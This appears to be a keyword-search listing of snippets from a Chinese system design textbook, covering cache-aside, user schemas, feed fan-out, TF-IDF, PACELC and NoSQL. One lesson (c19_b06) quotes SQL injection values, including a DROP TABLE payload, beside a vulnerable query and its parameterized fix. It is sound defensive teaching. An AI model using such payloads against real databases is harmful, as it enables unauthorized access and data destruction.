  c07_b04.md: ...#### Cache-Aside 算法  读取一个值：       1. Look up the key in the cache     2. If...
  c07_b04.md: ...权衡）的旋钮。   ### 7.4 Write-Through 和 Write-Behind——其他模式  Cache-aside 是懒加载：只在未命中时填充缓存。另外两种模式采取更主动的方式。...
  c07_b04.md: ...#### Cache-Aside 算法  读取一个值：       1. Look up the key in the cache     2. If...
  c07_b04.md: ...权衡）的旋钮。   ### 7.4 Write-Through 和 Write-Behind——其他模式  Cache-aside 是懒加载：只在未命中时填充缓存。另外两种模式采取更主动的方式。...
  c07_b05.md: ...取写入性能。这正是权衡矩阵追踪的 tradeoff（权衡）类型。   #### 常见误解  许多工程师假设 cache-aside 总是正确的默认。它是最常见模式，但有一个隐藏成本：**惊群问题（thundering herd）**。当缓存 key...
  c07_b11.md: ...据库能力范围内。命中率每提升一个百分点带来的价值与流量成正比。  **Q2.** 用 plain 语言解释 cache-aside、write-through 和 write-behind 缓存的区别。各举一个最适合的场景。  **答案：**  **...
  c07_b11.md: ...-through 和 write-behind 缓存的区别。各举一个最适合的场景。  **答案：**  **Cache-aside（懒加载）：** 应用显式检查缓存，未命中时从数据库取回并存储结果。缓存只在数据实际被请求时填充。最适合：并非所有数据都...
  c07_b13.md: ...正在争论该缓存什么。以下是他们在考虑的三种数据类型。对每种，分析访问模式，估算合适 TTL，并选择缓存策略（cache-aside、write-through 或 write-behind）：  (a) 用户头像照片（照片 URL 存在 users...
  c07_b13.md: ...可能只更新几次头像。旧数据后果：刚更新头像的用户几分钟内看到旧照片——有点烦人，但可接受。  缓存策略：**Cache-aside**，长 TTL（30–60 分钟）。照片更新时使缓存 key 失效。长 TTL 可接受，因为更新少且陈旧影响低。  缓...
  c07_b13.md: ...ough 或直接 Redis 计数器**。因为这个数字变化频繁且准确性重要，短 TTL（10–30 秒）加 cache-aside 可行，但会导致频繁未命中。更好的方法：直接把计数存为 Redis 整数，用 `INCR`/`DECR` 操作（原子、亚...
  c07_b13.md: ...,000,001——0.0001% 的变化，没有用户会注意。  缓存策略：**Write-behind 或 cache-aside 加长 TTL（10–60 分钟）**。这个计数本质上是近似的——没人需要实时看到精确当前数字。用 cache-asid...
  c07_b13.md: ...side 加长 TTL（10–60 分钟）**。这个计数本质上是近似的——没人需要实时看到精确当前数字。用 cache-aside，10 分钟 TTL。未命中时运行 `SELECT COUNT(*) FROM posts`（大表上可能慢——可改用 R...
  c07_b17.md: ...off（权衡）。对大多数多服务器应用，Redis 或 Memcached 这类分布式缓存是正确默认。  **Cache-aside** 是最常见模式：先查缓存，未命中时取数据库，填充缓存，返回。它是懒加载的（只缓存被请求的内容），并把失效责任交给应用...
  c11_b14.md: ...到旧资料。  **修复：** 把 `local_cache` 换成共享 Redis 缓存，使用第 7 章的 cache-aside 模式：       def get_user_profile(user_id):         cache_key...
  c20_b05.md: ...据集（最热的 1% URL = 约 100 万条记录 = 250MB）可放入内存。我们用 Redis 配合 cache-aside 模式（第 7 章）：  1. 请求到达短码 `abc1234` 2. 检查 Redis：缓存命中 → 立即返回重定向（...
  c20_b08.md: ...决策 | 延迟 | 一致性 | 可用性 | 运营复杂度 ---|---|---|---|--- Redis cache-aside（缓存主读策略） | 很低（命中 5ms） | 最终一致（基于 TTL 或显式失效） | 高（未命中回退到 DB） |...
  c27_b02.md: ...存。第一次陈旧 bug：用户更新了用户名，但缓存版本最多 60 秒仍显示旧名。  **关键决策：**  * Cache-aside 模式：应用先查缓存，未命中回数据库，回写缓存 * Profile 数据 TTL 60 秒 * Redis 部署在独立服...
  c27_b06.md: ...用户和帖子数据——以写吞吐限制为代价获得强一致性和持久性。”  **v2（添加缓存）时：** “Redis cache-aside 用于 profile——以陈旧和缓存失效复杂度为代价获得低延迟读。”  **v5（分片）时：** “User 表分片（...
  c28_b11.md: ...)** (Ch 6) | 低（写优化） | 可调（N/W/R quorum） | 极高（无主） | 高 **Cache-aside** (Ch 7) | 命中降低读；未命中走 DB | 最终（TTL 陈旧） | 高——缓存故障读仍存活 | 中——手动...

=== username (24 occurrences) ===
  c05_b01.md: ...该实体的一个实例。每一列代表一个属性。  SocialSnap 的初次尝试：  **users 表**  | id | username | email | password_hash | created_at | |---|---|---|---|---...
  c05_b02.md: ...的行组合起来。  “给我看 Alice 的所有帖子，连同 Alice 的用户名：”      SELECT users.username, posts.content, posts.created_at     FROM posts     JOIN us...
  c05_b02.md: ...JOIN users ON posts.user_id = users.id     WHERE users.username = 'alice'     ORDER BY posts.created_at DESC;  这条查询：  1. 从...
  c05_b06.md: ...BLE users (         id          SERIAL PRIMARY KEY,         username    VARCHAR(50) UNIQUE NOT NULL,         email       VARCHAR...
  c05_b06.md: ...SELECT posts.id, posts.content, posts.created_at, users.username     FROM posts     JOIN follows ON posts.user_id = follows....
  c05_b10.md: ...SELECT posts.id, posts.content, posts.created_at, author.username AS author     FROM mentions     JOIN posts ON mentions.post...
  c05_b10.md: ...id     WHERE mentions.user_id = (SELECT id FROM users WHERE username = 'alice')     ORDER BY posts.created_at DESC     LIMIT 20;...
  c09_b09.md: ...}      message User {       int64 id = 1;       string username = 2;       string bio = 3;     }   基于这个定义，gRPC 自动生成多语言（Go、P...
  c09_b14.md: ...会把这 4 个调用合并成一个查询：       query HomeFeed {       me {         username         photoUrl         followingCount         unreadNotif...
  c09_b14.md: ...}       feed(limit: 20) {         postId         author { username photoUrl }         content         likeCount         create...
  c11_b01.md: ...sessions = {         "sess_a7b3c9d2e4f1": {"user_id": 42, "username": "alice", "created_at": ...},         "sess_b8c4d0e5f2a3":...
  c11_b01.md: ...ted_at": ...},         "sess_b8c4d0e5f2a3": {"user_id": 7, "username": "bob", "created_at": ...},         ...     }   当带 cookie...
  c11_b04.md: ...# 之后：会话在 Redis 中（水平扩展正确）     def create_session(user_id, username):         session_id = generate_random_id()         session...
  c11_b04.md: ...te_random_id()         session_data = {"user_id": user_id, "username": username, "created_at": now()}          redis.setex(...
  c11_b04.md: ...d()         session_data = {"user_id": user_id, "username": username, "created_at": now()}          redis.setex(             f"s...
  c11_b06.md: ...ader**（算法和 token 类型） 2. 一个 **payload**（claims——会话数据：user_id、username、roles、过期时间） 3. 一个 **signature**（服务器用 secret key 生成的加密签名）  服...
  c11_b06.md: ...y 生成的加密签名）  服务器在登录时签发 JWT：  1. 创建 payload：`{"user_id": 42, "username": "alice", "exp": 1709510400}` 2. 用 secret key 签名：`HMACSHA2...
  c11_b06.md: ...签名）。如果签名有效，payload 数据就可信——服务器无需任何数据库或 Redis 查找就知道 user_id 和 username。   #### JWT 收益  **真正无状态：** 不需要 Redis 会话存储。每个请求都不需要外部查找。服务器用...
  c12_b11.md: ...：users 表和每条 post 行。  **答案：** 伪代码：       1. UPDATE users SET username = 'new_name' WHERE user_id = 42;  // 在用户所在 shard     2. 对每个...
  c19_b06.md: ...est.get("username")     query = f"SELECT * FROM users WHERE username = '{user_input}'"     db.execute(query)   如果用户提交用户名 `alice`...
  c19_b06.md: ...(query)   如果用户提交用户名 `alice`，查询变成 `SELECT * FROM users WHERE username = 'alice'`——无害。  但如果用户提交 `' OR '1'='1`，查询变成：       SELECT *...
  c19_b06.md: ...但如果用户提交 `' OR '1'='1`，查询变成：       SELECT * FROM users WHERE username = '' OR '1'='1'   条件 `'1'='1'` 永远为真，因此该查询返回数据库中所有用户。攻击者完全绕过...
  c19_b06.md: ...ROP TABLE users; --` 使查询变成：       SELECT * FROM users WHERE username = ''; DROP TABLE users; --'   这删除了整个 users 表。所有用户数据丢失。  SQL...
  c19_b06.md: ...pared statements）：       query = "SELECT * FROM users WHERE username = ?"     db.execute(query, [user_input])   在参数化查询中，数据库驱动将查询...

=== fanout (24 occurrences) ===
  c22_b06.md: ...thor_id, content, created_at) VALUES (...)`。这是事实来源。 2. **触发 Fanout Service：** Post Service 向 Kafka 发布事件：`{event: "post_created...
  c22_b06.md: ...created", post_id: P, author_id: U, created_at: ...}`。 3. **Fanout Service 决定策略：**     * 从关注者数据库查 U 的关注者数    * 若关注者数 < 1,000,0...
  c22_b07.md: ...重新排序（5ms）+ 序列化（2ms）≈ **约 24ms** 总计。远低于 200ms p99 要求。   #### Fanout Service 架构  Fanout Service 是一个 Kafka 消费者，处理 `post_created`...
  c22_b07.md: ...≈ **约 24ms** 总计。远低于 200ms p99 要求。   #### Fanout Service 架构  Fanout Service 是一个 Kafka 消费者，处理 `post_created` 事件——与第 8 章为 SocialS...
  c22_b07.md: ...Kafka 的异步解耦模式相同，现在应用于 feed 投递规模。它是扇出架构的心脏：  * **水平可扩展：** 多个 Fanout Service worker 并行消费 Kafka topic。如果某帖子有 50 万（500,000）关注者，工作被...
  c22_b07.md: ...worker 各处理 5 万（50,000）次关注者更新。 * **限速：** 50 万关注者帖子的扇出无法瞬间完成。Fanout Service 以受控速率处理扇出，把 Redis 写入负载分散到数秒而非数毫秒。这防止扇出不受控地飙升 Redis...
  c22_b07.md: ...台发生。这意味着关注者可能不会立刻看到帖子——但新鲜度 SLO（“99% 关注者在 60 秒内看到帖子”）被满足，因为 Fanout Service 在数秒内追上典型关注者数。  对 50 万（500,000）关注者用户，以每个 Fanout work...
  c22_b07.md: ...足，因为 Fanout Service 在数秒内追上典型关注者数。  对 50 万（500,000）关注者用户，以每个 Fanout worker 每秒 1 万（10,000）次 Redis 写入，单个 worker 50 秒完成扇出——刚好在 60...
  c22_b07.md: ...写入，单个 worker 50 秒完成扇出——刚好在 60 秒新鲜度 SLO 内。10 个 worker 并行：5 秒。Fanout worker 数量是新鲜度延迟的直接杠杆。...
  c22_b08.md: ...0 万（500,000）关注者用户，扇出在并行下需要数秒。60 秒 SLO 覆盖正常情况。  **系统过载：** 如果 Fanout Service 过载（热门帖子同时大量出现），扇出队列积压，新鲜度下降。Fanout Service 必须按突发容量扩...
  c22_b08.md: ...况。  **系统过载：** 如果 Fanout Service 过载（热门帖子同时大量出现），扇出队列积压，新鲜度下降。Fanout Service 必须按突发容量扩展，而非仅稳态。  **名人帖子：** 名人帖子（读时扇出）在用户发帖后加载 feed...
  c22_b08.md: ...拉刷新”或每 60 秒自动后台刷新）。这确保名人帖子和扇出延迟的帖子在一个刷新周期内出现。  新鲜度 SLO 同时考虑 Fanout Service 延迟和客户端刷新间隔。30 秒服务器（server）扇出时间 + 30 秒客户端刷新间隔 = 60 秒...
  c22_b12.md: ...50 位密友。这对扇出架构有什么影响？  提示  思考当只有部分关注者应看到帖子时，扇出流程有什么变化。这如何影响每帖 Fanout Service 的工作量？会简化还是复杂化 timeline 设计？  **答案：** 扇出架构需要感知帖子可见性。关...
  c22_b12.md: ...rivate')`。增加 `close_friends` 关系表：`(user_id, friend_id)`。  **Fanout Service 变更：** 处理 `visibility = 'close_friends'` 的 `post_cre...
  c22_b12.md: ...更：** 处理 `visibility = 'close_friends'` 的 `post_created` 事件时，Fanout Service 只获取作者的密友列表（不是所有关注者），并只写入这些用户的 timeline。  **对扇出成本的影响...
  c22_b12.md: ...务器在 Redis 中维护每用户“最新活动时间戳”：`user:F:latest_followed_activity`。Fanout Service 在把帖子扇出到 F 的 timeline 时更新它：`SET user:F:latest_follow...
  c22_b16.md: ...达到亚毫秒级。名人帖子在读取时合并，开销可忽略。读时用用户专属信号重新排序给出个性化 feed，而无陈旧预计算分数。  Fanout Service（异步 Kafka 消费者）把帖子创建与扇出解耦，让帖子创建立即返回，而扇出在后台在新鲜度 SLO 内完...
  c26_b10.md: ...sip 轮耗时 1 秒并到达一个随机 peer。需要多少轮？若把协议改为每轮每个节点向 K 个 peer gossip，fanout 如何变化？  提示  把 gossip 传播建模为指数增长。fanout 为 1 时，k 轮后约 2^k 个节点知道信...
  c26_b10.md: ...轮每个节点向 K 个 peer gossip，fanout 如何变化？  提示  把 gossip 传播建模为指数增长。fanout 为 1 时，k 轮后约 2^k 个节点知道信息（k 相对集群较小时的粗略近似）。...
  c26_b11.md: ...**答案：** fanout 为 1 时（每轮 1 个 peer，1 秒一轮）：k 轮后约 2^k 个节点知道信息。要覆盖 200 节点：2^k ≥...
  c26_b11.md: ...00 节点：2^k ≥ 200 → k ≥ log₂(200) ≈ 7.6 → 8 轮 → 8 秒。在 10 秒预算内。fanout 为 K 时（每轮每个节点向 K 个 peer gossip）：第 1 轮后：1 + K 个节点知情。第 2 轮后：约...
  c26_b11.md: ...→ 5 轮 → 5 秒。K=5：5^k ≥ 200 → k ≥ log₅(200) ≈ 3.3 → 4 轮 → 4 秒。fanout 更高传播更快，但网络流量更多（K=3 意味着每轮 gossip 消息是基线的 3 倍，K=5 则是 5 倍）。权衡：更...
  c26_b11.md: ...高传播更快，但网络流量更多（K=3 意味着每轮 gossip 消息是基线的 3 倍，K=5 则是 5 倍）。权衡：更高 fanout = 更快传播，但更多网络开销。对 200 节点集群、1 秒 gossip 间隔，fanout K=2（每轮 2 个 p...
  c26_b11.md: ...是 5 倍）。权衡：更高 fanout = 更快传播，但更多网络开销。对 200 节点集群、1 秒 gossip 间隔，fanout K=2（每轮 2 个 peer）可在 8 秒内传播——远低于 10 秒预算——而网络开销仅为基线的 2 倍。（K=2：...

=== idf (24 occurrences) ===
  c23_b05.md: ...些词远比其他词常见，造成热分片）且多词查询需要跨多个分片协调。  * * *   ### 23.3 相关性排序——TF-IDF 及更远  倒排索引告诉我们哪些文档包含查询词。排序决定其中哪些先显示。这是搜索最难的部分——而且 arguably 是...
  c23_b06.md: ...#### TF-IDF：直觉  回到我们的例子。一份关于 "distributed systems（分布式系统）" 的文档如果提到该短语 50...
  c23_b06.md: ...。但如果网上每份文档都提到 "systems" 50 次呢？"systems" 太常见，高频几乎不能说明什么。  TF-IDF（Term Frequency - Inverse Document Frequency）的直觉是：  * **Term...
  c23_b06.md: ...分文档毫无作用。  合起来：一个词对文档的相关性得分高，当且仅当它在这份文档中出现频繁，且在整个文档集中罕见。  TF-IDF(t,d)=TF(t,d)×IDF(t) TF(t,d)=term t 在 document d 中的次数 / docu...
  c23_b06.md: ...对文档的相关性得分高，当且仅当它在这份文档中出现频繁，且在整个文档集中罕见。  TF-IDF(t,d)=TF(t,d)×IDF(t) TF(t,d)=term t 在 document d 中的次数 / document d 中的总词数 IDF(...
  c23_b06.md: ...×IDF(t) TF(t,d)=term t 在 document d 中的次数 / document d 中的总词数 IDF(t)=log(总文档数 / 包含 t 的文档数)  出现在每份文档中的词 IDF = log(1) = 0——对排序无...
  c23_b06.md: .../ document d 中的总词数 IDF(t)=log(总文档数 / 包含 t 的文档数)  出现在每份文档中的词 IDF = log(1) = 0——对排序无贡献。只出现在 1 份文档中的词 IDF = log(10,000,000,000...
  c23_b06.md: ...t 的文档数)  出现在每份文档中的词 IDF = log(1) = 0——对排序无贡献。只出现在 1 份文档中的词 IDF = log(10,000,000,000) ≈ 23——找到它是强信号。  多词查询 "distributed con...
  c23_b06.md: ...—找到它是强信号。  多词查询 "distributed consistency" 对某文档的总分是每个查询词的 TF-IDF 得分之和。   #### 常见误解  关于 TF-IDF 的常见误解是更高的 TF 总意味着更好排名。但 TF 会被文...
  c23_b06.md: ...consistency" 对某文档的总分是每个查询词的 TF-IDF 得分之和。   #### 常见误解  关于 TF-IDF 的常见误解是更高的 TF 总意味着更好排名。但 TF 会被文档长度归一化。一份 10,000 词的文档提到 "dist...
  c23_b06.md: ...200 词提到 5 次的文档对该术语的密度更低。长度归一化防止长文档总是击败短小聚焦的文档。   #### 超越 TF-IDF——PageRank 与链接分析  TF-IDF 根据内容衡量文档与查询的相关性。但它无法衡量文档是否可信或权威。垃圾页...
  c23_b06.md: ...长度归一化防止长文档总是击败短小聚焦的文档。   #### 超越 TF-IDF——PageRank 与链接分析  TF-IDF 根据内容衡量文档与查询的相关性。但它无法衡量文档是否可信或权威。垃圾页面可以炮制一份文档，每段都提到 "distrib...
  c23_b06.md: ...垃圾页面可以炮制一份文档，每段都提到 "distributed systems（分布式系统）" 500 次，单凭 TF-IDF 会得极高分数。  Larry Page 和 Sergey Brin 原创工作的关键洞察：链接即背书。一个网页链接到另一...
  c23_b07.md: ...非每次查询）重新计算，所以是批处理操作。   #### 现代排序——众多信号  真实搜索引擎使用数百种信号，远超 TF-IDF 和 PageRank：  * 锚文本（指向某页面的链接中的可点击文字常是该页面的好描述） * 页面新鲜度（最近更新页面...
  c23_b08.md: ...g list。 3. **打分：** 对每个候选文档（出现在 posting list 交集中的文档），计算结合 TF-IDF 和 PageRank 的相关性分数。 4. **Top-K 选择：** 返回 K 个最高得分文档，无需完全排序整个结果...
  c23_b09.md: ...制。(3) frontier 必须集成重复检测，避免把已见 URL 重新入队。  **Q2.** 用自己的话解释 TF-IDF 直觉。为什么 IDF 用对数？  **答案：** TF（词频）捕捉一个词对特定文档的重要性：一个词在文档中出现很多次，...
  c23_b09.md: ...ier 必须集成重复检测，避免把已见 URL 重新入队。  **Q2.** 用自己的话解释 TF-IDF 直觉。为什么 IDF 用对数？  **答案：** TF（词频）捕捉一个词对特定文档的重要性：一个词在文档中出现很多次，很可能是文档焦点。ID...
  c23_b09.md: ...DF 用对数？  **答案：** TF（词频）捕捉一个词对特定文档的重要性：一个词在文档中出现很多次，很可能是文档焦点。IDF（逆文档频率）捕捉一个词在整个文档集中的罕见程度：几乎每份文档都出现的词区分力很小。两者相乘，TF-IDF 高当且仅当一...
  c23_b09.md: ...能是文档焦点。IDF（逆文档频率）捕捉一个词在整个文档集中的罕见程度：几乎每份文档都出现的词区分力很小。两者相乘，TF-IDF 高当且仅当一个词在文档中出现频繁且在整个文档集中罕见——两个条件都信号真实相关性。IDF 中的对数防止极罕见词主导。否...
  c23_b09.md: ...词区分力很小。两者相乘，TF-IDF 高当且仅当一个词在文档中出现频繁且在整个文档集中罕见——两个条件都信号真实相关性。IDF 中的对数防止极罕见词主导。否则，100 亿份文档中只有 1 份出现的词原始 IDF 是 100 亿，完全压倒其他词的...
  c23_b09.md: ...中罕见——两个条件都信号真实相关性。IDF 中的对数防止极罕见词主导。否则，100 亿份文档中只有 1 份出现的词原始 IDF 是 100 亿，完全压倒其他词的 TF 贡献。对数压缩范围，使罕见词信号与常见词信号成比例。  **Q3.** 什么是...
  c23_b10.md: ...–50ms，并行）：每个分片从本地倒排索引查找 3 个词的 posting list，交集得到候选文档 ID，用 TF-IDF 和预计算 PageRank（每个文档存储）对候选打分，返回 top-K 结果。这是主导延迟步骤。(4) **合并与重新...
  c23_b13.md: ...；搜索快是因为工作提前完成。Posting list 用 TF、位置和字段指示器增强，支持排序和短语匹配。  **TF-IDF** 通过术语特异性镜头对文档相关性排序：语料库中罕见但文档中频繁的词是强相关性信号。**PageRank** 用结构信...
  c28_b14.md: ...查询延迟极低（预计算） | 最终（新文档出现前有索引延迟） | 高（复制分片） | 高——分片管理、重索引 **TF-IDF ranking** (Ch 23) | 无查询延迟开销（分数预计算） | N/A | N/A | 中——语料变化时重算...

=== pacelc (23 occurrences) ===
  c04_b01.md: ...本章把这种张力形式化为分布式系统中最重要的理论结果之一：CAP 定理。然后我们会超越 CAP，转向一个更实用的框架——PACELC——它捕捉日常系统设计中真正重要的 tradeoff（权衡）。   ### 4.1 三个性质  在陈述定理之前，我们需要...
  c04_b03.md: ...——它们经历延迟变化、负载尖峰、不是干净二分划分的部分失败。对于这些常见情况，CAP 给出的指导是不完整的。  这就是 PACELC 的用武之地。   ### 4.3 PACELC——实践中更重要的 tradeoff  2012 年，Daniel Ab...
  c04_b03.md: ...的部分失败。对于这些常见情况，CAP 给出的指导是不完整的。  这就是 PACELC 的用武之地。   ### 4.3 PACELC——实践中更重要的 tradeoff  2012 年，Daniel Abadi 提出 PACELC 作为 CAP 的扩展...
  c04_b03.md: ...### 4.3 PACELC——实践中更重要的 tradeoff  2012 年，Daniel Abadi 提出 PACELC 作为 CAP 的扩展，捕捉工程师多数时候真正面临的 tradeoff。  PACELC 读作：**PA/ELC**——...
  c04_b03.md: ...Daniel Abadi 提出 PACELC 作为 CAP 的扩展，捕捉工程师多数时候真正面临的 tradeoff。  PACELC 读作：**PA/ELC**——“如果存在分区（Partition），在可用性（Availability）和一致性（Co...
  c04_b03.md: ...Else，系统正常运行时），在延迟（Latency）和一致性（Consistency）之间选择。”   #### 定义：PACELC  **PACELC** 扩展了 CAP，指出即使没有分区，分布式系统也必须在**延迟**和**一致性**之间 trad...
  c04_b03.md: ...行时），在延迟（Latency）和一致性（Consistency）之间选择。”   #### 定义：PACELC  **PACELC** 扩展了 CAP，指出即使没有分区，分布式系统也必须在**延迟**和**一致性**之间 tradeoff：  * *...
  c04_b04.md: ...#### 用 PACELC 对真实系统分类  | 系统 | P 选择 | EL 选择 | 说明 | |---|---|---|---| | Pos...
  c04_b04.md: ...C | 用于协调；为正确性牺牲可用性 | | MySQL 异步复制 | A | L | 立即接受写入；副本落后 |  PACELC 迫使你在系统设计时回答两个问题，而不是一个。   ### 4.4 一致性模型——一个谱系  真实系统不只是选择“强”或...
  c04_b06.md: ...到 SocialSnap  但如何把这些理论 tradeoff 真正转化为真实产品的具体数据库选择？  我们用 CAP/PACELC 框架为规模化中的 SocialSnap 做具体决策。  **SocialSnap 的组件清单：**  * 用户认证（登...
  c04_b06.md: ...术——每一种都针对其数据类型的一致性需求调优。   ### 4.7 权衡矩阵更新  在第 2 章权衡矩阵基础上，CAP/PACELC 框架带来一次重大扩展：  | 设计选择 | 延迟 | 吞吐 | 一致性 | 可用性 | 持久性 | 复杂度 | |--...
  c04_b07.md: ...混为一谈的工程师常会犯架构错误——例如，以为标着“ACID”的数据库在分布式多主设置下也会正确表现。  **Q3.** PACELC 如何扩展 CAP？为什么“ELC”（否则：延迟 vs 一致性）部分通常比分区行为在实践中更重要？  **答案：** P...
  c04_b07.md: ...C 如何扩展 CAP？为什么“ELC”（否则：延迟 vs 一致性）部分通常比分区行为在实践中更重要？  **答案：** PACELC 扩展了 CAP，因为它认识到网络分区虽然重要，但相对罕见。常见的是分布式系统即使在正常运行时也面临的日常 tradeo...
  c04_b08.md: ...LC tradeoff（为一致性支付延迟的权衡）是直接的业务指标。  CAP 的分区行为告诉你系统在紧急情况下会做什么。PACELC 的 ELC tradeoff（权衡）告诉你系统每天每分钟的表现。...
  c04_b10.md: ...Oregon 可能略旧），要么只写本地副本（Virginia 的两个）再异步同步到 Oregon。这是直接的 CAP/PACELC tradeoff（权衡）：跨区域同步一致性让每次写入操作多花 42 ms。  这运用了第 3 章的估算方法（延迟数字、...
  c04_b10.md: ...发现，有 12 笔转账被重复处理（同一笔转账执行了两次）。两家银行都通过调整分录纠正了重复处理错误。  用 CAP 和 PACELC 框架分析两种设计。哪种设计对银行场景更合适，为什么？在什么情况下（如果有）竞争对手的方法可以被接受？  提示  把每家...
  c04_b10.md: ...如果有）竞争对手的方法可以被接受？  提示  把每家银行在分区期间的行为映射到 CAP 选择（C vs A）。然后思考 PACELC 的“ELC”维度：每家银行在正常（非分区）运行时交易什么？答案不是简单的“银行里正确性总是赢”——想想哪些银行产品可能...
  c04_b10.md: ...立继续接受转账。由于无法协调，有些转账被处理两次（写冲突）。该银行选择事后通过对账解决不一致。这是 AP 设计。  **PACELC 分析：**  即使在分区事件之外，A 银行为保持线性一致性所需的同步复制也会给每次写入增加延迟——每笔转账在返回成功前...
  c04_b12.md: ...公司做咨询，该公司正在构建一个协作文档编辑器（类似 Google Docs）。用户可以从不同地点同时编辑同一份文档。用 PACELC 框架勾画该用例的一致性需求。哪些一致性模型适用？在这个语境下，“最终一致性”的“最终”部分意味着什么？  **讨论：*...
  c04_b13.md: ...是全有或全无（线性一致或不是）。但一致性谱系（因果、单调读、读己之写、最终）在极端之间有许多有用的点。  这就是为什么 PACELC 作为日常设计工具更有用——它捕捉了即使没有分区也存在的连续延迟-一致性 tradeoff，也更适合“这个操作需要强一致...
  c04_b13.md: ...f，也更适合“这个操作需要强一致性，那个不需要”的真实系统思维。CAP 是一个优美的理论结果，证明了某件重要的事不可能。PACELC 是一个实用的设计框架，用于绕过这种不可能性。   ### 本章总结  CAP 定理确立了一个基本限制：在分布式系统中，...
  c04_b13.md: ...每个节点响应）和分区容错性（系统在网络故障下仍工作）。因为真实网络会分区，实际选择是：分区期间，牺牲一致性或可用性。  PACELC 扩展了 CAP，加入了日常更重要的洞察：即使没有分区（“否则”情况），分布式系统也必须在延迟和一致性之间 tradeo...
  c14_b14.md: ...（来自 Martin Kleppmann 的工作）：实际 tradeoff（权衡） 是**一致性 vs. 延迟**，由 PACELC 定理表达——分区（P）时选可用性（A）或一致性（C）；否则（E），即使没有分区，也要选延迟（L）或一致性（C）。这种重...

=== nosql (23 occurrences) ===
  c04_b07.md: ...2. 分布式数据库可以在每个节点上有 ACID 事务，但跨节点不是线性一致的（因为节点之间可能不一致）。 3. 许多 NoSQL 数据库牺牲 CAP-一致性（线性一致性），但在单个节点内仍维护某种 ACID 一致性。  把这两个含义混为一谈的工程师...
  c05_b13.md: ...量的路径进行时才能强制执行。  **Q2.** 关系型数据库已主导数据存储 50 年，但 2000–2010 年代一波 NoSQL 数据库挑战了其主导地位。NoSQL 并没有取代关系型数据库——今天两者共存。这告诉了你工程 tradeoff 的什么本...
  c05_b13.md: ...Q2.** 关系型数据库已主导数据存储 50 年，但 2000–2010 年代一波 NoSQL 数据库挑战了其主导地位。NoSQL 并没有取代关系型数据库——今天两者共存。这告诉了你工程 tradeoff 的什么本质？面对新项目应如何评估用哪个？...
  c05_b13.md: ...天两者共存。这告诉了你工程 tradeoff 的什么本质？面对新项目应如何评估用哪个？  **讨论：** 关系型 vs NoSQL 的故事说明了一个基本原理：**每种技术都是特定情境下的正确工具，任何工具的主导地位都反映了它被设计时的情境。**  关...
  c05_b14.md: ...工作负载变成读密集型（社交 Feed、内容分发） * schema 灵活性变得有价值（用户生成内容的形状不可预测）  NoSQL 数据库并不比关系型数据库“更好”——它们为不同情境优化。这告诉我们：  1. **没有放之四海皆正确的技术。** 评估...
  c05_b14.md: ...载和约束。 2. **主导技术会积累惯性。** 关系型数据库极其成熟，有 50 年工具积累，并提供强正确性保证。即使在 NoSQL 理论上更好的情境，SQL 的运营熟悉度也常获胜。 3. **正确问题永远是：“鉴于我的访问模式、规模、一致性需求和团队...
  c05_b14.md: ...”**——而不是“总体上最好的数据库是什么？”  在第 6 章，我们将审视关系型数据库力不从心的具体访问模式，以及每种 NoSQL 家族如何应对它们。   ### 本章总结  **关系模型**把数据组织成有定义 schema 的表，通过外键连接。它的...
  c06_b01.md: ...结构化数据、复杂多表查询和强一致性；它们在不 predictable 的 schema、极端写吞吐和图遍历面前挣扎。  NoSQL 数据库正是为这些不匹配而存在。“NoSQL”不是单一事物——它是一个由四种不同类型数据库组成的家族，每种都针对不同的访...
  c06_b01.md: ...predictable 的 schema、极端写吞吐和图遍历面前挣扎。  NoSQL 数据库正是为这些不匹配而存在。“NoSQL”不是单一事物——它是一个由四种不同类型数据库组成的家族，每种都针对不同的访问模式优化。学会识别哪种类型适合哪种工作负载...
  c06_b01.md: ...种都针对不同的访问模式优化。学会识别哪种类型适合哪种工作负载，是系统设计中最实用的技能之一。   ### 6.1 四大 NoSQL 家族  四种 NoSQL 数据库家族，各自有独特的数据模型：  | 家族 | 数据模型 | 优势 | 示例系统 | |...
  c06_b01.md: ...。学会识别哪种类型适合哪种工作负载，是系统设计中最实用的技能之一。   ### 6.1 四大 NoSQL 家族  四种 NoSQL 数据库家族，各自有独特的数据模型：  | 家族 | 数据模型 | 优势 | 示例系统 | |---|---|---|-...
  c06_b05.md: ...型数据自然建模、表达力强的图查询语言（Neo4j 的 Cypher）。  **代价（规模）：** 图数据库通常不如其他 NoSQL 类型容易分布。一个放不进单台机器的图很难分片——因为任何边都可能连接不同机器上的节点，让每次遍历都变成网络调用。大多数...
  c06_b05.md: ....6 BASE vs ACID——一致性哲学  第 5 章介绍了 ACID：关系型数据库强一致性和正确性的哲学。大多数 NoSQL 数据库采取不同哲学，概括为 **BASE**：...
  c06_b06.md: ...以及为什么复杂系统常同时包含 ACID 和 BASE 组件，各自服务适合其哲学的数据类型。   #### 常见误解  “NoSQL 意味着没有一致性。” 错误。许多 NoSQL 数据库提供可调一致性级别。Cassandra 允许你要求写入被所有副本确...
  c06_b06.md: ...ASE 组件，各自服务适合其哲学的数据类型。   #### 常见误解  “NoSQL 意味着没有一致性。” 错误。许多 NoSQL 数据库提供可调一致性级别。Cassandra 允许你要求写入被所有副本确认（强一致性，类似 ACID），代价是降低可用...
  c06_b06.md: ...*第 3 步：一致性要求是什么？**  * 需要强一致性（金融数据、认证） → 关系型数据库 * 可接受最终一致性 → NoSQL 选项打开  **第 4 步：预期规模如何？**  * < 100 万行、< 1,000 写入/秒 → 关系型数据库能处...
  c06_b06.md: ...万行、< 1,000 写入/秒 → 关系型数据库能处理 * > 1 亿行或 > 10,000 写入/秒 → 考虑分布式 NoSQL  **第 5 步：团队经验如何？**  * 有成熟的 PostgreSQL 经验 → 除非出现明确需求，否则继续用它...
  c06_b07.md: ...### 6.8 权衡矩阵更新  把四大 NoSQL 家族加入我们的权衡矩阵：  | 设计选择 | 延迟 | 吞吐 | 一致性 | 可用性 | 持久性 | 复杂度 | |-...
  c06_b07.md: ...通常 ACID | ↓ 难分片；水平扩展有限 | ↑ 持久化 | ↑↑ 专用查询语言；极端规模下难分布 |  关键模式：NoSQL 家族都做出与 BASE 相同的宏观 tradeoff（权衡）——通过放松一致性保证来换取可用性和吞吐。具体 trade...
  c06_b10.md: ...的选择。  提示  先想访问模式：最频繁的操作是什么，写入量多大？然后想查询：“5km 内所有司机”是空间查询——四大 NoSQL 家族有哪个原生支持？  **答案：**  **按决策框架分析：**  **第 1 步：主要访问模式：**  * 高容量...
